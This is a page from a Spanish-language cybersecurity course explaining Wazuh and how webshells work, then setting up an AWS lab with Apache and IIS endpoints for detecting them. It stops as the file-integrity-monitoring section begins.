@@ -1,0 +1,1657 @@
+
+<!doctype html>
+<html lang="es" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Configuración escenario Wazuh server, clientes Linux y Windows. Reglas para detectar webshells. AWS, Amazon, Terraform, ansible, automatizado, automatización. Apuntes, teoría, prácticas, ejercicio del curso de especialización de ciberseguridad. IES severo ochoa Elche. Hacking ético. incidentes de seguridad, puesta en producción segura.">
+      
+      
+      
+        <link rel="canonical" href="https://jogonar-rgb.github.io/Ciberseguridad_25_26/Gestion_incidentes/wazuh/">
+      
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
+    
+    
+      
+        <title>Detección de webshells con Wazuh - Seguridad en sistemas del curso de especialista en ciberseguridad</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.e53b48f4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="light-green" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#que-es-wazuh" class="md-skip">
+          Saltar a contenido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="../.." title="Seguridad en sistemas del curso de especialista en ciberseguridad" class="md-header__button md-logo" aria-label="Seguridad en sistemas del curso de especialista en ciberseguridad" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Seguridad en sistemas del curso de especialista en ciberseguridad
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Detección de webshells con Wazuh
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="light-green" data-md-color-accent="indigo"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="indigo"  aria-label="Cambiar a modo normal"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo normal" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Buscar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando búsqueda
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Pestañas" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Introducción
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../warm/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Warm up
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../Seguridad_ofensiva/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Seguridad ofensiva
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Seguridad en sistemas del curso de especialista en ciberseguridad" class="md-nav__button md-logo" aria-label="Seguridad en sistemas del curso de especialista en ciberseguridad" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Seguridad en sistemas del curso de especialista en ciberseguridad
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introducción
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../warm/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Warm up
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Warm up
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../warm/Apuntes_Linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Entornos Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../warm/Ejercicios_Linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ejercicios propuestos Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../warm/Apuntes_Windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Entornos Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../warm/Ejercicios_Windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ejercicios propuestos Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../warm/webgrafia/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Webgrafía
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../Seguridad_ofensiva/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Seguridad ofensiva
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Seguridad ofensiva
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Seguridad_ofensiva/Intro/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introducción
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Seguridad_ofensiva/nmap101/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introducción a Nmap
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Seguridad_ofensiva/enumeracion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Enumeración de servicios
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Seguridad_ofensiva/servicios_desact/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Causas de vulnerabilidades en sistemas
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Seguridad_ofensiva/exploit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Explotación de vulnerabilidades
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Seguridad_ofensiva/metasploit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Metasploit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Seguridad_ofensiva/privesc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Escalada de privilegios
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Seguridad_ofensiva/ad_enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Enumeración en entornos AD (Active Directory)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Seguridad_ofensiva/passw_manag/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Gestión y almacenamiento de credenciales en Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Seguridad_ofensiva/phising/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Spoofing & phising
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Seguridad_ofensiva/HackingAD1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ataques en entornos Active Directory
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Seguridad_ofensiva/webgrafia/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Webgrafía
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>Detección de webshells con Wazuh</h1>
+
+<h2 id="que-es-wazuh">¿Qué es Wazuh?</h2>
+<p>Wazuh, en palabras de su creador, el español Santiago Basset, es una proyecto open source que trata de prevenir, detectar y responder a amenazas.</p>
+<p>Técnicamente podría considerarse un HIDS (Host Intrusion Detection System). Estos dispositivos usualmente centraban la importancia en los eventos en la red. Sin embargo esta es una tendencia cambiante, como vemos en este gráfico de ejemplo de MITRE:</p>
+<p><img alt="" src="../img/threats.webp" /></p>
+<p>Así pues, Wazuh quizás se acerque más a un <a href="https://wazuh.com/platform/xdr/">XDR</a> o un <a href="https://wazuh.com/platform/siem/">SIEM</a>.</p>
+<p>Su objetivo principal es <strong>monitorizar la seguridad de los sistemas, detectar amenazas, responder ante incidentes y facilitar el cumplimiento normativo</strong>, todo desde una única consola centralizada.</p>
+<p>Wazuh se ha convertido en una solución ampliamente adoptada por su <strong>versatilidad, escalabilidad y transparencia</strong>, y es utilizada tanto en entornos empresariales como académicos.</p>
+<h2 id="historia-y-evolucion">🧬 Historia y evolución</h2>
+<p>Wazuh nació como un <strong>fork de OSSEC</strong>, un proyecto veterano de HIDS, al que se le añadieron mejoras sustanciales en escalabilidad, arquitectura modular, interfaz gráfica, soporte a tecnologías modernas y extensibilidad. Con el tiempo, Wazuh evolucionó hacia una solución integral de <strong>detección y respuesta</strong> que va mucho más allá del simple monitoreo de logs o archivos.</p>
+<h2 id="arquitectura-de-wazuh">🧱 Arquitectura de Wazuh</h2>
+<p>Wazuh sigue una arquitectura <strong>cliente-servidor</strong> (o mejor dicho, <strong>agente-mánager-dashboard</strong>), compuesta por varios componentes clave:</p>
+<h3 id="1-agentes-wazuh">1. Agentes Wazuh</h3>
+<p>Instalados en sistemas finales (Windows, Linux, macOS), los agentes recogen:</p>
+<ul>
+<li>Logs del sistema y aplicaciones</li>
+<li>Actividad de red y procesos</li>
+<li>Cambios en archivos (FIM)</li>
+<li>Eventos de seguridad (fallos de autenticación, escalada de privilegios, etc.)</li>
+</ul>
+<h3 id="2-manager-wazuh">2. Manager Wazuh</h3>
+<p>Es el núcleo del sistema:</p>
+<ul>
+<li>Recibe y analiza los datos de los agentes</li>
+<li>Aplica reglas de correlación</li>
+<li>Genera alertas de seguridad</li>
+<li>Ejecuta respuestas activas si se configuran</li>
+</ul>
+<h3 id="3-wazuh-indexer-basado-en-opensearchelasticsearch">3. Wazuh Indexer (basado en OpenSearch/Elasticsearch)</h3>
+<p>Almacena y permite consultar grandes volúmenes de datos estructurados, como eventos y alertas de seguridad, mediante búsquedas rápidas y complejas.</p>
+<h3 id="4-wazuh-dashboard">4. Wazuh Dashboard</h3>
+<p>Interfaz web basada en Kibana/OpenSearch Dashboards:</p>
+<ul>
+<li>Visualización de alertas, logs, informes y cumplimiento</li>
+<li>Gestión de políticas de seguridad</li>
+<li>Seguimiento de incidentes en tiempo real</li>
+</ul>
+<h2 id="capacidades-clave-de-wazuh">🧠 Capacidades clave de Wazuh</h2>
+<table>
+<thead>
+<tr>
+<th>Función</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>🔍 <strong>HIDS</strong></td>
+<td>Detección basada en host de archivos modificados, nuevos procesos, cambios en el sistema, etc.</td>
+</tr>
+<tr>
+<td>📑 <strong>FIM (File Integrity Monitoring)</strong></td>
+<td>Monitorización de archivos críticos del sistema o aplicaciones web (muy útil contra webshells).</td>
+</tr>
+<tr>
+<td>📜 <strong>Análisis de logs</strong></td>
+<td>Ingesta y análisis de logs de sistemas, aplicaciones, dispositivos de red, servicios cloud (AWS, Azure, GCP).</td>
+</tr>
+<tr>
+<td>🛡️ <strong>Detección de amenazas</strong></td>
+<td>Reglas de correlación que detectan patrones de ataque, como escaladas de privilegios, movimiento lateral o conexiones sospechosas.</td>
+</tr>
+<tr>
+<td>🤖 <strong>Respuestas activas</strong></td>
+<td>Scripts automáticos para bloquear IPs, cerrar procesos o modificar configuraciones ante incidentes.</td>
+</tr>
+<tr>
+<td>🏛️ <strong>Cumplimiento normativo</strong></td>
+<td>Módulos y plantillas para PCI-DSS, GDPR, HIPAA, NIST 800-53, etc., con informes automatizados.</td>
+</tr>
+<tr>
+<td>☁️ <strong>Integración cloud y contenedores</strong></td>
+<td>Integración con Kubernetes, Docker, AWS CloudTrail, Azure logs, etc. para visibilidad en entornos híbridos y nativos de la nube.</td>
+</tr>
+<tr>
+<td>🧩 <strong>Extensibilidad</strong></td>
+<td>Uso de decoders, reglas personalizadas, integraciones con VirusTotal, Suricata, Zeek, TheHive, etc.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="casos-de-uso-tipicos">🎯 Casos de uso típicos</h2>
+<ul>
+<li>Monitorización de seguridad de endpoints (EDR/HIDS)</li>
+<li>Detección de accesos no autorizados y malware</li>
+<li>Detección de webshells en servidores web (con FIM + análisis de logs + reglas personalizadas)</li>
+<li>Cumplimiento normativo automatizado</li>
+<li>Integración con herramientas de respuesta a incidentes (SOAR, TheHive, MISP)</li>
+</ul>
+<h2 id="web-shells">Web shells</h2>
+<p>Los cibercriminales utilizan diferentes técnicas para conseguir la persistencia en un sistema previamente comprometido. Una de estas técnicas son las web shells.</p>
+<h3 id="que-son-las-webshells">¿Qué son las webshells?</h3>
+<p>Son scripts web que permiten a los atacantes acceso remoto sin restricciones. Puede pasar que un atacante logra comprometer un servidor, consiguiendo el acceso inicial al servicio web mediante alguna técnica ya conocida (SQLi, XSS, RFI...).</p>
+<p>Con este compromiso inicial, se puede intentar realizar la inyección de una web shell en el directorio del servidor y que constituirá un <em>backdoor</em> que dará paso a actividades post-explotación (ejecución de comandos, exfiltración de información, infección de malware...).</p>
+<p><img alt="" src="../img/wazuh1.png" /></p>
+<p>La mayoría de los web shells siguen los mismos principios de diseño y e intenciones. Normalmente suelen estar escritos en lenguajes soportados por los servidores web: PHP, ASP, ASP.NET, Perl, Python...</p>
+<h3 id="indicadores-comunes-de-los-web-shells">Indicadores comunes de los web shells</h3>
+<ul>
+<li><strong><u>Archivos subidos o modificados recientemente:</u></strong> los atacantes suelen subir sus web shells en los directorios utilizados por los servidores web o modificar archivos ya presentes en ellos. Disonancias en las fechas de modificación pueden ser un indicativo.</u></li>
+<li><strong><u>Conexiones de red inusuales:</u></strong> las web shell puede que tengan que poner determinados puertos a la escucha para establecer <em>reverse shells</em> o shells inversas hacia los atacantes. Esto producirá tráfico inusual (TCP o UDP), que puede ser un indicador de compromiso.</li>
+<li><strong><u>Configuraciones extrañas/erróneas y cabeceras modificadas:</u></strong> cabeceras clásiscas de las peticiones HTTP son <em>user-agent</em> o <em>referer</em>. Los atacantes pueden realizar la modificación de estas cabeceras de tal forma que se intente una ejecución de comandos mediante ellas.</li>
+<li><strong><u>Técnicas de ofuscación:</u></strong> puede que el atacante emplee técnicas de codificación, compresión o sustitución para intentar ser detectado por los sitemas de seguridad.</li>
+</ul>
+<h2 id="manos-a-la-obra-configuracion-del-laboratorio">Manos a la obra, configuración del laboratorio</h2>
+<p>Para este laboratorio utilizaremos AWS, por la versatilidad que nos ofrece y así deshacernos de los problemas de infraestructa a los que pueda limitarnos nuestra máquina. Se van a utilizar <strong>4 máquinas</strong>:</p>
+<ol>
+<li><strong>Amazon Linux 2:</strong> para instalar el servidor de Wazuh.</li>
+<li><strong>Ubuntu:</strong> como víctima endpoint que está ejecutando un agente de Wazuh. Correrá un servidor Apache para aplicaciones PHP.</li>
+<li><strong>Windows Server 2022:</strong> otra víctima endpoint ejecutadno otro agente de Wazuh. Correrá un servidor IIS para aplicaciones ASP.NET.</li>
+<li><strong>Debian:</strong> como máquina atacante.</li>
+</ol>
+<h3 id="wazuh-server-en-amazon-linux-2">Wazuh server en Amazon Linux 2</h3>
+<p>La instalación del servidor de Wazuh o Wazuh manager se puede realizar siguiendo <a href="https://documentation.wazuh.com/current/quickstart.html">este</a> sencillo tutorial.</p>
+<h3 id="agente-wazuh-en-ubuntu-2204">Agente Wazuh en Ubuntu 22.04</h3>
+<p>Los pasos vienen detallados <a href="https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-linux.html">aquí</a></p>
+<div class="admonition warning">
+<p class="admonition-title">Atención</p>
+<div class="highlight"><pre><span></span><code>Elegid la pestaña ***APT***, que es la que os dará las indicaciones para realizar las acciones con el gestor de paquetes correspondiente.
+</code></pre></div>
+</div>
+<h3 id="agente-de-wazuh-en-windows-server-2022">Agente de Wazuh en Windows Server 2022</h3>
+<p>En este caso las instrucciones están <a href="https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-windows.html">aquí</a> y os dará la opción, en las pestañas, de elegir una instalación gráfica o por línea de comandos.</p>
+<div class="admonition warning">
+<p class="admonition-title">Atención</p>
+<div class="highlight"><pre><span></span><code>Recordad poner como IP de Wazuh manager la de vuestro server de Wazuh.
+</code></pre></div>
+</div>
+<h3 id="servidor-web-apache-en-endpoint-ubuntu">Servidor web Apache en endpoint Ubuntu</h3>
+<p>Pasos a seguir:</p>
+<ol>
+<li>
+<p>Instalar Apache:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>sudo<span class="w"> </span>apt-get<span class="w"> </span>update
+<span class="gp">$ </span>sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>apache2
+</code></pre></div>
+</li>
+<li>
+<p>Instalar PHP 8.1 para poder correr aplicaciones PHP</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>--no-install-recommends<span class="w"> </span>php8.1
+</code></pre></div>
+<p>Así evitaremos instalar paquetes adicionales.</p>
+</li>
+<li>
+<p>Para verificar la instalación podemos acceder a la URL: <code>http://IP_UBUNTU_ENDPOINT</code>y nos mostrará la página por defecto de Apache.</p>
+</li>
+</ol>
+<h3 id="servidor-web-iis-en-endpoint-windows-server">Servidor web IIS en endpoint Windows Server</h3>
+<p>Para proceder con esta instalación:</p>
+<ol>
+<li>
+<p>En el menú de inicio de Windows, escribimos <code>appwiz.cpl</code> y le decimos <em>Turn Windows features on or off</em>:</p>
+<p><img alt="" src="../img/windows-server-wazuh2.png" /></p>
+</li>
+<li>
+<p>En <em>Server Roles</em> instalamos <strong>Web Server (IIS)</strong> conm, al menos, las siguientes funciones:</p>
+<p><img alt="" src="../img/windows-server-wazuh.png" /></p>
+</li>
+<li>
+<p>Para verificar la instalación accedemos a la URL: <code>http://IP_WINDOWS_ENDPOINT</code></p>
+</li>
+</ol>
+<div class="admonition danger">
+<p class="admonition-title">¡Atención, importante!</p>
+<p>En la comunicación entre los agentes y el servidor intervienen distintos puertos. <u><strong>La forma fácil de evitaros todo problema</strong></u> es añadir una regla de seguridad a todas las máquinas donde se permite cualquier conexión entrante (TCP/UDP, cualquier puerto) desde la red 172.31.0.0/16. </p>
+<p>Esto no supone un gran problema de seguridad puesto que es el segmento de red <strong>privado</strong> que nos asigna AWS Academy por defecto. En esencia lo que hacemos es dejar que todas las máquinas dentro de esa red se comuniquen sin cortapisas.</p>
+</div>
+<h2 id="escenario-hipotetico">Escenario hipotético</h2>
+<p>El endpoint Ubuntu corre un Apache con PHP instalado y el endpoint Windows Server corre un servidor web IIS, capaz de interpretar código ASP.NET.</p>
+<p>Puesto que las web shells se consideran malware post-explotación, hemos de asumir que el atcante ya posee acceso inicial a los endpoints. Lo que el atacante desea conseguir es la persistencia en el sistema comprometido con el fin de llevar a cabo estas labores de  post-explotación.</p>
+<h2 id="tecnicas-de-deteccion">Técnicas de detección</h2>
+<p>Utilizaremos distintas capacidades de Wazuh para detectar la presencia de web shells en PHP o ASP.NET.</p>
+<h3 id="integridad-de-ficheros">Integridad de ficheros</h3>
+<p>Utilizaremos <strong>FIM (File Integritiy Monitorint)</strong> para deteta rla creación y modificación de archivos que contengan web shells.</p>
